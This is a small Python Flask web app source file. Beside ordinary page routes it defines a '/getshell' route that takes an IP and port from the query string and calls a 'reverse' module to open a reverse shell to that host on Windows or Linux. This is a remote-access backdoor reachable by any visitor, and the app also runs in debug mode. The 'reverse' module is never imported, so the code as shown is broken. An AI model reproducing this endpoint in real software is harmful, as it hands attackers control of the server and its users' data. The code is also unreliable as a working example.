from flask import Flask, request, render_template
import os

app = Flask(__name__)


@app.route("/")
def indexpage():
	return render_template("index.html")


@app.route("/getshell")
def reverse_shell():
	ip = request.args.get('ip')
	port = request.args.get('port')
	if not ip or not port:
		return "<script>console.log('IP or PORT must be provided on parameters!')</script>"

	if os.name == "nt":
		reverse.windows(ip, int(port))
	else:
		reverse.linux(ip, int(port))

@app.route("/dashboard")
def dashboard():
	return render_template("dashboard.html")


@app.route("/about")
def aboutpage():
	return render_template("about.html")


if __name__ == '__main__':
	app.run(debug=True)